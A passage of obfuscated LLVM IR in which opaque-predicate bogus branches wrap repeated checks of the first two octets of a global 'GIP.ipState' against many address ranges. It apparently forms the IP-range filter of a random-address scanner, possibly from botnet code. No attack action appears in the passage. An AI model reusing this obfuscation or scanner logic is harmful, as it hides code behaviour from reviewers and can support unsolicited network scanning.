  %1382 = urem i32 %1381, 2
  %1383 = icmp eq i32 %1382, 0
  %1384 = icmp slt i32 %1379, 10
  %1385 = or i1 %1383, %1384
  br i1 %1385, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br i1 %1377, label %1386, label %1394

; <label>:1386:                                   ; preds = %originalBBpart2188
  %1387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1388 = zext i8 %1387 to i32
  %1389 = icmp sge i32 %1388, 99
  br i1 %1389, label %1390, label %1394

; <label>:1390:                                   ; preds = %1386
  %1391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1392 = zext i8 %1391 to i32
  %1393 = icmp slt i32 %1392, 253
  br i1 %1393, label %5042, label %1394

; <label>:1394:                                   ; preds = %1390, %1386, %originalBBpart2188
  %1395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = icmp eq i32 %1396, 146
  br i1 %1397, label %1398, label %1438

; <label>:1398:                                   ; preds = %1394
  %1399 = load i32, i32* @x.71
  %1400 = load i32, i32* @y.72
  %1401 = sub i32 %1399, 1
  %1402 = mul i32 %1399, %1401
  %1403 = urem i32 %1402, 2
  %1404 = icmp eq i32 %1403, 0
  %1405 = icmp slt i32 %1400, 10
  %1406 = or i1 %1404, %1405
  br i1 %1406, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1398
  %1407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1408 = zext i8 %1407 to i32
  %1409 = icmp sge i32 %1408, 165
  %1410 = load i32, i32* @x.71
  %1411 = load i32, i32* @y.72
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br i1 %1409, label %1418, label %1438

; <label>:1418:                                   ; preds = %originalBBpart2192
  %1419 = load i32, i32* @x.71
  %1420 = load i32, i32* @y.72
  %1421 = sub i32 %1419, 1
  %1422 = mul i32 %1419, %1421
  %1423 = urem i32 %1422, 2
  %1424 = icmp eq i32 %1423, 0
  %1425 = icmp slt i32 %1420, 10
  %1426 = or i1 %1424, %1425
  br i1 %1426, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1418
  %1427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1428 = zext i8 %1427 to i32
  %1429 = icmp slt i32 %1428, 166
  %1430 = load i32, i32* @x.71
  %1431 = load i32, i32* @y.72
  %1432 = sub i32 %1430, 1
  %1433 = mul i32 %1430, %1432
  %1434 = urem i32 %1433, 2
  %1435 = icmp eq i32 %1434, 0
  %1436 = icmp slt i32 %1431, 10
  %1437 = or i1 %1435, %1436
  br i1 %1437, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1429, label %5042, label %1438

; <label>:1438:                                   ; preds = %originalBBpart2196, %originalBBpart2192, %1394
  %1439 = load i32, i32* @x.71
  %1440 = load i32, i32* @y.72
  %1441 = sub i32 %1439, 1
  %1442 = mul i32 %1439, %1441
  %1443 = urem i32 %1442, 2
  %1444 = icmp eq i32 %1443, 0
  %1445 = icmp slt i32 %1440, 10
  %1446 = or i1 %1444, %1445
  br i1 %1446, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1438
  %1447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1448 = zext i8 %1447 to i32
  %1449 = icmp eq i32 %1448, 147
  %1450 = load i32, i32* @x.71
  %1451 = load i32, i32* @y.72
  %1452 = sub i32 %1450, 1
  %1453 = mul i32 %1450, %1452
  %1454 = urem i32 %1453, 2
  %1455 = icmp eq i32 %1454, 0
  %1456 = icmp slt i32 %1451, 10
  %1457 = or i1 %1455, %1456
  br i1 %1457, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1449, label %1458, label %1482

; <label>:1458:                                   ; preds = %originalBBpart2200
  %1459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1460 = zext i8 %1459 to i32
  %1461 = icmp sge i32 %1460, 35
  br i1 %1461, label %1462, label %1482

; <label>:1462:                                   ; preds = %1458
  %1463 = load i32, i32* @x.71
  %1464 = load i32, i32* @y.72
  %1465 = sub i32 %1463, 1
  %1466 = mul i32 %1463, %1465
  %1467 = urem i32 %1466, 2
  %1468 = icmp eq i32 %1467, 0
  %1469 = icmp slt i32 %1464, 10
  %1470 = or i1 %1468, %1469
  br i1 %1470, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1462
  %1471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1472 = zext i8 %1471 to i32
  %1473 = icmp slt i32 %1472, 43
  %1474 = load i32, i32* @x.71
  %1475 = load i32, i32* @y.72
  %1476 = sub i32 %1474, 1
  %1477 = mul i32 %1474, %1476
  %1478 = urem i32 %1477, 2
  %1479 = icmp eq i32 %1478, 0
  %1480 = icmp slt i32 %1475, 10
  %1481 = or i1 %1479, %1480
  br i1 %1481, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br i1 %1473, label %5042, label %1482

; <label>:1482:                                   ; preds = %originalBBpart2204, %1458, %originalBBpart2200
  %1483 = load i32, i32* @x.71
  %1484 = load i32, i32* @y.72
  %1485 = sub i32 %1483, 1
  %1486 = mul i32 %1483, %1485
  %1487 = urem i32 %1486, 2
  %1488 = icmp eq i32 %1487, 0
  %1489 = icmp slt i32 %1484, 10
  %1490 = or i1 %1488, %1489
  br i1 %1490, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1482
  %1491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1492 = zext i8 %1491 to i32
  %1493 = icmp eq i32 %1492, 147
  %1494 = load i32, i32* @x.71
  %1495 = load i32, i32* @y.72
  %1496 = sub i32 %1494, 1
  %1497 = mul i32 %1494, %1496
  %1498 = urem i32 %1497, 2
  %1499 = icmp eq i32 %1498, 0
  %1500 = icmp slt i32 %1495, 10
  %1501 = or i1 %1499, %1500
  br i1 %1501, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1493, label %1502, label %1526

; <label>:1502:                                   ; preds = %originalBBpart2208
  %1503 = load i32, i32* @x.71
  %1504 = load i32, i32* @y.72
  %1505 = sub i32 %1503, 1
  %1506 = mul i32 %1503, %1505
  %1507 = urem i32 %1506, 2
  %1508 = icmp eq i32 %1507, 0
  %1509 = icmp slt i32 %1504, 10
  %1510 = or i1 %1508, %1509
  br i1 %1510, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1502
  %1511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1512 = zext i8 %1511 to i32
  %1513 = icmp sge i32 %1512, 103
  %1514 = load i32, i32* @x.71
  %1515 = load i32, i32* @y.72
  %1516 = sub i32 %1514, 1
  %1517 = mul i32 %1514, %1516
  %1518 = urem i32 %1517, 2
  %1519 = icmp eq i32 %1518, 0
  %1520 = icmp slt i32 %1515, 10
  %1521 = or i1 %1519, %1520
  br i1 %1521, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1513, label %1522, label %1526

; <label>:1522:                                   ; preds = %originalBBpart2212
  %1523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1524 = zext i8 %1523 to i32
  %1525 = icmp slt i32 %1524, 105
  br i1 %1525, label %5042, label %1526

; <label>:1526:                                   ; preds = %1522, %originalBBpart2212, %originalBBpart2208
  %1527 = load i32, i32* @x.71
  %1528 = load i32, i32* @y.72
  %1529 = sub i32 %1527, 1
  %1530 = mul i32 %1527, %1529
  %1531 = urem i32 %1530, 2
  %1532 = icmp eq i32 %1531, 0
  %1533 = icmp slt i32 %1528, 10
  %1534 = or i1 %1532, %1533
  br i1 %1534, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1526
  %1535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1536 = zext i8 %1535 to i32
  %1537 = icmp eq i32 %1536, 147
  %1538 = load i32, i32* @x.71
  %1539 = load i32, i32* @y.72
  %1540 = sub i32 %1538, 1
  %1541 = mul i32 %1538, %1540
  %1542 = urem i32 %1541, 2
  %1543 = icmp eq i32 %1542, 0
  %1544 = icmp slt i32 %1539, 10
  %1545 = or i1 %1543, %1544
  br i1 %1545, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1537, label %1546, label %1554

; <label>:1546:                                   ; preds = %originalBBpart2216
  %1547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1548 = zext i8 %1547 to i32
  %1549 = icmp sge i32 %1548, 168
  br i1 %1549, label %1550, label %1554

; <label>:1550:                                   ; preds = %1546
  %1551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1552 = zext i8 %1551 to i32
  %1553 = icmp slt i32 %1552, 170
  br i1 %1553, label %5042, label %1554

; <label>:1554:                                   ; preds = %1550, %1546, %originalBBpart2216
  %1555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1556 = zext i8 %1555 to i32
  %1557 = icmp eq i32 %1556, 147
  br i1 %1557, label %1558, label %1598

; <label>:1558:                                   ; preds = %1554
  %1559 = load i32, i32* @x.71
  %1560 = load i32, i32* @y.72
  %1561 = sub i32 %1559, 1
  %1562 = mul i32 %1559, %1561
  %1563 = urem i32 %1562, 2
  %1564 = icmp eq i32 %1563, 0
  %1565 = icmp slt i32 %1560, 10
  %1566 = or i1 %1564, %1565
  br i1 %1566, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1558
  %1567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1568 = zext i8 %1567 to i32
  %1569 = icmp sge i32 %1568, 198
  %1570 = load i32, i32* @x.71
  %1571 = load i32, i32* @y.72
  %1572 = sub i32 %1570, 1
  %1573 = mul i32 %1570, %1572
  %1574 = urem i32 %1573, 2
  %1575 = icmp eq i32 %1574, 0
  %1576 = icmp slt i32 %1571, 10
  %1577 = or i1 %1575, %1576
  br i1 %1577, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br i1 %1569, label %1578, label %1598

; <label>:1578:                                   ; preds = %originalBBpart2220
  %1579 = load i32, i32* @x.71
  %1580 = load i32, i32* @y.72
  %1581 = sub i32 %1579, 1
  %1582 = mul i32 %1579, %1581
  %1583 = urem i32 %1582, 2
  %1584 = icmp eq i32 %1583, 0
  %1585 = icmp slt i32 %1580, 10
  %1586 = or i1 %1584, %1585
  br i1 %1586, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1578
  %1587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1588 = zext i8 %1587 to i32
  %1589 = icmp slt i32 %1588, 200
  %1590 = load i32, i32* @x.71
  %1591 = load i32, i32* @y.72
  %1592 = sub i32 %1590, 1
  %1593 = mul i32 %1590, %1592
  %1594 = urem i32 %1593, 2
  %1595 = icmp eq i32 %1594, 0
  %1596 = icmp slt i32 %1591, 10
  %1597 = or i1 %1595, %1596
  br i1 %1597, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1589, label %5042, label %1598

; <label>:1598:                                   ; preds = %originalBBpart2224, %originalBBpart2220, %1554
  %1599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1600 = zext i8 %1599 to i32
  %1601 = icmp eq i32 %1600, 147
  br i1 %1601, label %1602, label %1610

; <label>:1602:                                   ; preds = %1598
  %1603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1604 = zext i8 %1603 to i32
  %1605 = icmp sge i32 %1604, 238
  br i1 %1605, label %1606, label %1610

; <label>:1606:                                   ; preds = %1602
  %1607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1608 = zext i8 %1607 to i32
  %1609 = icmp slt i32 %1608, 255
  br i1 %1609, label %5042, label %1610

; <label>:1610:                                   ; preds = %1606, %1602, %1598
  %1611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1612 = zext i8 %1611 to i32
  %1613 = icmp eq i32 %1612, 150
  br i1 %1613, label %1614, label %1638

; <label>:1614:                                   ; preds = %1610
  %1615 = load i32, i32* @x.71
  %1616 = load i32, i32* @y.72
  %1617 = sub i32 %1615, 1
  %1618 = mul i32 %1615, %1617
  %1619 = urem i32 %1618, 2
  %1620 = icmp eq i32 %1619, 0
  %1621 = icmp slt i32 %1616, 10
  %1622 = or i1 %1620, %1621
  br i1 %1622, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1614
  %1623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1624 = zext i8 %1623 to i32
  %1625 = icmp sge i32 %1624, 113
  %1626 = load i32, i32* @x.71
  %1627 = load i32, i32* @y.72
  %1628 = sub i32 %1626, 1
  %1629 = mul i32 %1626, %1628
  %1630 = urem i32 %1629, 2
  %1631 = icmp eq i32 %1630, 0
  %1632 = icmp slt i32 %1627, 10
  %1633 = or i1 %1631, %1632
  br i1 %1633, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br i1 %1625, label %1634, label %1638

; <label>:1634:                                   ; preds = %originalBBpart2228
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp slt i32 %1636, 115
  br i1 %1637, label %5042, label %1638

; <label>:1638:                                   ; preds = %1634, %originalBBpart2228, %1610
  %1639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1640 = zext i8 %1639 to i32
  %1641 = icmp eq i32 %1640, 152
  br i1 %1641, label %1642, label %1650

; <label>:1642:                                   ; preds = %1638
  %1643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1644 = zext i8 %1643 to i32
  %1645 = icmp sge i32 %1644, 151
  br i1 %1645, label %1646, label %1650

; <label>:1646:                                   ; preds = %1642
  %1647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1648 = zext i8 %1647 to i32
  %1649 = icmp slt i32 %1648, 155
  br i1 %1649, label %5042, label %1650

; <label>:1650:                                   ; preds = %1646, %1642, %1638
  %1651 = load i32, i32* @x.71
  %1652 = load i32, i32* @y.72
  %1653 = sub i32 %1651, 1
  %1654 = mul i32 %1651, %1653
  %1655 = urem i32 %1654, 2
  %1656 = icmp eq i32 %1655, 0
  %1657 = icmp slt i32 %1652, 10
  %1658 = or i1 %1656, %1657
  br i1 %1658, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1650
  %1659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1660 = zext i8 %1659 to i32
  %1661 = icmp eq i32 %1660, 153
  %1662 = load i32, i32* @x.71
  %1663 = load i32, i32* @y.72
  %1664 = sub i32 %1662, 1
  %1665 = mul i32 %1662, %1664
  %1666 = urem i32 %1665, 2
  %1667 = icmp eq i32 %1666, 0
  %1668 = icmp slt i32 %1663, 10
  %1669 = or i1 %1667, %1668
  br i1 %1669, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1661, label %1670, label %1678

; <label>:1670:                                   ; preds = %originalBBpart2232
  %1671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1672 = zext i8 %1671 to i32
  %1673 = icmp sge i32 %1672, 21
  br i1 %1673, label %1674, label %1678

; <label>:1674:                                   ; preds = %1670
  %1675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1676 = zext i8 %1675 to i32
  %1677 = icmp slt i32 %1676, 32
  br i1 %1677, label %5042, label %1678

; <label>:1678:                                   ; preds = %1674, %1670, %originalBBpart2232
  %1679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1680 = zext i8 %1679 to i32
  %1681 = icmp eq i32 %1680, 155
  br i1 %1681, label %1682, label %1706

; <label>:1682:                                   ; preds = %1678
  %1683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1684 = zext i8 %1683 to i32
  %1685 = icmp sge i32 %1684, 5
  br i1 %1685, label %1686, label %1706

; <label>:1686:                                   ; preds = %1682
  %1687 = load i32, i32* @x.71
  %1688 = load i32, i32* @y.72
  %1689 = sub i32 %1687, 1
  %1690 = mul i32 %1687, %1689
  %1691 = urem i32 %1690, 2
  %1692 = icmp eq i32 %1691, 0
  %1693 = icmp slt i32 %1688, 10
  %1694 = or i1 %1692, %1693
  br i1 %1694, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1686
  %1695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp slt i32 %1696, 10
  %1698 = load i32, i32* @x.71
  %1699 = load i32, i32* @y.72
  %1700 = sub i32 %1698, 1
  %1701 = mul i32 %1698, %1700
  %1702 = urem i32 %1701, 2
  %1703 = icmp eq i32 %1702, 0
  %1704 = icmp slt i32 %1699, 10
  %1705 = or i1 %1703, %1704
  br i1 %1705, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %1697, label %5042, label %1706

; <label>:1706:                                   ; preds = %originalBBpart2236, %1682, %1678
  %1707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1708 = zext i8 %1707 to i32
  %1709 = icmp eq i32 %1708, 155
  br i1 %1709, label %1710, label %1734

; <label>:1710:                                   ; preds = %1706
  %1711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1712 = zext i8 %1711 to i32
  %1713 = icmp sge i32 %1712, 74
  br i1 %1713, label %1714, label %1734

; <label>:1714:                                   ; preds = %1710
  %1715 = load i32, i32* @x.71
  %1716 = load i32, i32* @y.72
  %1717 = sub i32 %1715, 1
  %1718 = mul i32 %1715, %1717
  %1719 = urem i32 %1718, 2
  %1720 = icmp eq i32 %1719, 0
  %1721 = icmp slt i32 %1716, 10
  %1722 = or i1 %1720, %1721
  br i1 %1722, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1714
  %1723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1724 = zext i8 %1723 to i32
  %1725 = icmp slt i32 %1724, 89
  %1726 = load i32, i32* @x.71
  %1727 = load i32, i32* @y.72
  %1728 = sub i32 %1726, 1
  %1729 = mul i32 %1726, %1728
  %1730 = urem i32 %1729, 2
  %1731 = icmp eq i32 %1730, 0
  %1732 = icmp slt i32 %1727, 10
  %1733 = or i1 %1731, %1732
  br i1 %1733, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %1725, label %5042, label %1734

; <label>:1734:                                   ; preds = %originalBBpart2240, %1710, %1706
  %1735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = icmp eq i32 %1736, 155
  br i1 %1737, label %1738, label %1746

; <label>:1738:                                   ; preds = %1734
  %1739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1740 = zext i8 %1739 to i32
  %1741 = icmp sge i32 %1740, 213
  br i1 %1741, label %1742, label %1746

; <label>:1742:                                   ; preds = %1738
  %1743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1744 = zext i8 %1743 to i32
  %1745 = icmp slt i32 %1744, 222
  br i1 %1745, label %5042, label %1746

; <label>:1746:                                   ; preds = %1742, %1738, %1734
  %1747 = load i32, i32* @x.71
  %1748 = load i32, i32* @y.72
  %1749 = sub i32 %1747, 1
  %1750 = mul i32 %1747, %1749
  %1751 = urem i32 %1750, 2
  %1752 = icmp eq i32 %1751, 0
  %1753 = icmp slt i32 %1748, 10
  %1754 = or i1 %1752, %1753
  br i1 %1754, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1746
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp eq i32 %1756, 157
  %1758 = load i32, i32* @x.71
  %1759 = load i32, i32* @y.72
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %1757, label %1766, label %1790

; <label>:1766:                                   ; preds = %originalBBpart2244
  %1767 = load i32, i32* @x.71
  %1768 = load i32, i32* @y.72
  %1769 = sub i32 %1767, 1
  %1770 = mul i32 %1767, %1769
  %1771 = urem i32 %1770, 2
  %1772 = icmp eq i32 %1771, 0
  %1773 = icmp slt i32 %1768, 10
  %1774 = or i1 %1772, %1773
  br i1 %1774, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1766
  %1775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1776 = zext i8 %1775 to i32
  %1777 = icmp sge i32 %1776, 150
  %1778 = load i32, i32* @x.71
  %1779 = load i32, i32* @y.72
  %1780 = sub i32 %1778, 1
  %1781 = mul i32 %1778, %1780
  %1782 = urem i32 %1781, 2
  %1783 = icmp eq i32 %1782, 0
  %1784 = icmp slt i32 %1779, 10
  %1785 = or i1 %1783, %1784
  br i1 %1785, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %1777, label %1786, label %1790

; <label>:1786:                                   ; preds = %originalBBpart2248
  %1787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1788 = zext i8 %1787 to i32
  %1789 = icmp slt i32 %1788, 154
  br i1 %1789, label %5042, label %1790

; <label>:1790:                                   ; preds = %1786, %originalBBpart2248, %originalBBpart2244
  %1791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1792 = zext i8 %1791 to i32
  %1793 = icmp eq i32 %1792, 158
  br i1 %1793, label %1794, label %1802

; <label>:1794:                                   ; preds = %1790
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp sge i32 %1796, 1
  br i1 %1797, label %1798, label %1802

; <label>:1798:                                   ; preds = %1794
  %1799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1800 = zext i8 %1799 to i32
  %1801 = icmp slt i32 %1800, 21
  br i1 %1801, label %5042, label %1802

; <label>:1802:                                   ; preds = %1798, %1794, %1790
  %1803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1804 = zext i8 %1803 to i32
  %1805 = icmp eq i32 %1804, 158
  br i1 %1805, label %1806, label %1830

; <label>:1806:                                   ; preds = %1802
  %1807 = load i32, i32* @x.71
  %1808 = load i32, i32* @y.72
  %1809 = sub i32 %1807, 1
  %1810 = mul i32 %1807, %1809
  %1811 = urem i32 %1810, 2
  %1812 = icmp eq i32 %1811, 0
  %1813 = icmp slt i32 %1808, 10
  %1814 = or i1 %1812, %1813
  br i1 %1814, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1806
  %1815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = icmp sge i32 %1816, 235
  %1818 = load i32, i32* @x.71
  %1819 = load i32, i32* @y.72
  %1820 = sub i32 %1818, 1
  %1821 = mul i32 %1818, %1820
  %1822 = urem i32 %1821, 2
  %1823 = icmp eq i32 %1822, 0
  %1824 = icmp slt i32 %1819, 10
  %1825 = or i1 %1823, %1824
  br i1 %1825, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %1817, label %1826, label %1830

; <label>:1826:                                   ; preds = %originalBBpart2252
  %1827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1828 = zext i8 %1827 to i32
  %1829 = icmp slt i32 %1828, 247
  br i1 %1829, label %5042, label %1830

; <label>:1830:                                   ; preds = %1826, %originalBBpart2252, %1802
  %1831 = load i32, i32* @x.71
  %1832 = load i32, i32* @y.72
  %1833 = sub i32 %1831, 1
  %1834 = mul i32 %1831, %1833
  %1835 = urem i32 %1834, 2
  %1836 = icmp eq i32 %1835, 0
  %1837 = icmp slt i32 %1832, 10
  %1838 = or i1 %1836, %1837
  br i1 %1838, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1830
  %1839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1840 = zext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 159
  %1842 = load i32, i32* @x.71
  %1843 = load i32, i32* @y.72
  %1844 = sub i32 %1842, 1
  %1845 = mul i32 %1842, %1844
  %1846 = urem i32 %1845, 2
  %1847 = icmp eq i32 %1846, 0
  %1848 = icmp slt i32 %1843, 10
  %1849 = or i1 %1847, %1848
  br i1 %1849, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br i1 %1841, label %1850, label %1874

; <label>:1850:                                   ; preds = %originalBBpart2256
  %1851 = load i32, i32* @x.71
  %1852 = load i32, i32* @y.72
  %1853 = sub i32 %1851, 1
  %1854 = mul i32 %1851, %1853
  %1855 = urem i32 %1854, 2
  %1856 = icmp eq i32 %1855, 0
  %1857 = icmp slt i32 %1852, 10
  %1858 = or i1 %1856, %1857
  br i1 %1858, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %1850
  %1859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1860 = zext i8 %1859 to i32
  %1861 = icmp sge i32 %1860, 120
  %1862 = load i32, i32* @x.71
  %1863 = load i32, i32* @y.72
  %1864 = sub i32 %1862, 1
  %1865 = mul i32 %1862, %1864
  %1866 = urem i32 %1865, 2
  %1867 = icmp eq i32 %1866, 0
  %1868 = icmp slt i32 %1863, 10
  %1869 = or i1 %1867, %1868
  br i1 %1869, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %1861, label %1870, label %1874

; <label>:1870:                                   ; preds = %originalBBpart2260
  %1871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1872 = zext i8 %1871 to i32
  %1873 = icmp slt i32 %1872, 121
  br i1 %1873, label %5042, label %1874

